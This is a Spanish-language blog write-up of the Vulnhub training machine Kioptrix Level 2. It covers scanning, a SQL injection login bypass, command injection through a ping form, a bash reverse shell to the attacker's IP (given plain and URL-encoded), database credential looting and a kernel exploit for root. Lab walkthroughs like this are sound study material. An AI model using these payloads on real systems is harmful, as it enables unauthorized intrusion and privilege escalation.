---
layout: single
title: Kioptrix Level 2 (Vulnhub) - WriteUp (by blu3ming)
excerpt: "Writeup de la máquina Kioptrix Nivel 2 de la plataforma Vunlhub. Nota: Puede incluir fallos y rabbit holes, los cuales se especifican, con el objetivo de que el lector no cometa los mismos errores que yo. Se recomienda leer el artículo completo antes de seguirlo al pie de la letra."
date: 2021-06-1
classes: wide
header:
  teaser: /assets/images/kioptrix-2/portada.jpeg
  teaser_home_page: true
categories:
  - Writeup
tags:
  - Vulnhub
  - Writeup
  - Guia
---

[https://www.vulnhub.com/entry/kioptrix-level-11-2,23/](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)

+ Verificamos con una traza ICMP el sistema operativo que corre en el servidor. Por le valor del TTL, se deduce que se trata de un sistema Linux.

	![1]
	
+ Un escaneo de nmap revela los servicios y puertos que corren en el servidor. Hay un servicio HTTP, SSH, HTTPS, MySQL, entre otros
  
    ``nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 192.168.0.12 -oG allPorts``
	
	![2]

+ Dado que hay servicios web, empleamos whatweb para escanear en busca de servidores, CMS, y elementos de relevancia en la página. En el caso del HTTP, se observa un campo de contraseña, por lo que se deduce que hay un panel de logueo. En el caso del HTTPS, no es posible detectar las tecnologías que corre el servidor en este puerto.

    ![3]
    
+ Si realizamos un escaneo con scripts básicos de enumeración en nmap, enfocado a los puertos encontrados anteriormente, veremos las versiones y software que corren en el servidor. Sin embargo, a diferencia de la máquina anterior de Kioptrix, ahora estos no cuentan con vulnerabilidades conocidas que nos permitan acceder al sistema o escalar privilegios.

    ![4]
	
+ El siguiente paso es revisar el servicio web con ayuda de un navegador. Vemos que efectivamente, hay un panel de logueo como index. Se intenta vulnerar con una inyección SQL, la cual es:
	
	``‘ or 1=1-- -``
	
	En este caso, no importa la contraseña, ya que la inyección permitirá acceder al primer usuario registrado, el cual normalmente es el usuario administrador.
	
	![5]
    
+ Vemos que la inyección funciona correctamente, ya que accedemos al sistema como usuario administrador. Vemos una página que dice poder realizar un comando ping a una red que se le especifique. En este punto, se deduce que por detrás, el servicio web está ejecutando un comando directamente en el servidor, por lo que es el camino perfecto para introducir una reverse shell que se conecte a nosotros.

	Si observamos el código fuente, veremos que debería haber un campo para introducir la IP a la cual realizar el ping, junto con un botón para enviar el dato al servidor. Sin embargo, estos campos no se muestran al renderizar el sitio web, dado que hay un error en el código fuente, faltando una comilla en el **td align=’center**.

    ![6]
    
+ Como no podemos modificar la página web, lo que podemos hacer es enviar la petición por medio de POST con los datos que solicita el sitio. Para ello, empleamos Burpsuite para interceptar la petición, modificarla, y poder enviarla. Para hacer un primer intento, se manda una IP, a lo cual se observa que el servidor responde con una respuesta común a un comando **ping**.
    
    ![7]
    
	Para ejecutar dos comandos en una sola línea, estos se separan por medio de un punto y coma (;), así que le concatenamos un comando whoami para corroborar que se ejecute. Como podemos observar en la respuesta, el comando se ejecuta correctamente.

    ![8]
    
	Ahora solo nos queda concatenar una reverse shell al comando. Para ello, se deben codificar los espacios como “+” y los & como su codificación %26. Además de escapar el símbolo “-”.

	```
		bash -i >& /dev/tcp/192.168.0.6/443 0>&1	Pasa a ser:
		bash+\-i+>%26+/dev/tcp/192.168.0.6/443+0>%261
	```

    ![9]
    
+ De esta manera, obtenemos una shell dentro del sistema. Ahora solo nos queda escalar privilegios, por lo que comenzamos a enumerar. Vemos a dos usuarios, llamados **john** y **harold**.
    
    ![10]
	
+ Recordemos que en el sistema corre un servicio MySQL, por lo que intentamos conectarnos para tratar de encontrar contraseñas de usuario que podamos usar. Por desgracia, la única base de datos a la que podemos acceder, está vacía.
    
    ![11]
	
+ Recordemos que esta base de datos es usada por el sistema web que vimos en un inicio para permitir el acceso mediante el logueo, por lo que procedemos a revisar el código fuente (ya completo) de dicho servicio. Vemos que la página se conecta al servicio MySQL por medio del usuario **john** y la contraseña **hiroshima**.
    
    ![12]
	
+ Intentamos usar esa contraseña para loguearnos en el servidor como el usuario john (por si hubiera reutilización de contraseñas), por desgracia, esta no funcionó. Nos conectamos entonces al servicio MySQL con este usuario y contraseñas, y vemos que ahora podemos acceder a más bases de datos que antes nos eran imposibles.
    
    ![13]
	
+ Si observamos dentro de la base de datos **webapp**, veremos una tabla llamada **users**, la cual contiene dos usuarios: **admin** y **john**, junto con sus contraseñas.
    
    ![14]
	
+ Intentamos loguearnos de nuevo al servidor Linux con estas credenciales, por desgracia, no funcionaron. No teniendo más información que enumerar (se buscaron además por permisos SUID y tareas cron), procedemos a emplear un enumerador automatizado como **LinENUM**. Para copiarlo al sistema, necesitamos una carpeta donde tengamos permisos de escritura. En este caso, fue /etc/shm.
    
    ![15]

+ Lo primero que nos devuelve el script, es la versión que corre en el servidor de Linux, la cual es la **2.6.9-55**.
    
    ![16]
	
+ Si buscamos vulnerabilidades para esta versión en específico, veremos que hay un exploit que permite el escalado de privilegios en el sistema, por lo que buscamos este mismo script en la herramienta searchsploit.
    
    ![17]

    ![18]
	
+ Esta herramienta nos devuelve varios exploits para el escalado de privilegios. Intentamos el primero, el cual tiene el número de identificación **1397**. Por desgracia, la misma herramienta nos indica que la versión del kernel encontrada no es vulnerable al exploit.
    
    ![19]
	
+ Procedemos a explotar el segundo script encontrado, el cual vulnera el parámetro **id_append_data()** para escalar privilegios.
    
    ![20]
	
+ Si copiamos el código a la máquina víctima, y compilamos con ayuda de gcc, al momento de ejecutarlo este devuelve de forma automática una bash como el usuario root. En este punto, hemos comprometido correctamente la máquina.
    
    ![21]
    
+ **Nota:** Queda como aprendizaje el enumerar aparte la versión del kernel y del sistema operativo que corren en la máquina. Esto se hace con ayuda de **uname -a** y **lsb_release -a**.
    
[1]:/assets/images/kioptrix-2/1.png
[2]:/assets/images/kioptrix-2/2.png
[3]:/assets/images/kioptrix-2/3.png
[4]:/assets/images/kioptrix-2/4.png
[5]:/assets/images/kioptrix-2/5.png
[6]:/assets/images/kioptrix-2/6.png
[7]:/assets/images/kioptrix-2/7.png
[8]:/assets/images/kioptrix-2/8.png
[9]:/assets/images/kioptrix-2/9.png
[10]:/assets/images/kioptrix-2/10.png
[11]:/assets/images/kioptrix-2/11.png
[12]:/assets/images/kioptrix-2/12.png
[13]:/assets/images/kioptrix-2/13.png
[14]:/assets/images/kioptrix-2/14.png
[15]:/assets/images/kioptrix-2/15.png
[16]:/assets/images/kioptrix-2/16.png
[17]:/assets/images/kioptrix-2/17.png
[18]:/assets/images/kioptrix-2/18.png
[19]:/assets/images/kioptrix-2/19.png
[20]:/assets/images/kioptrix-2/20.png
[21]:/assets/images/kioptrix-2/21.png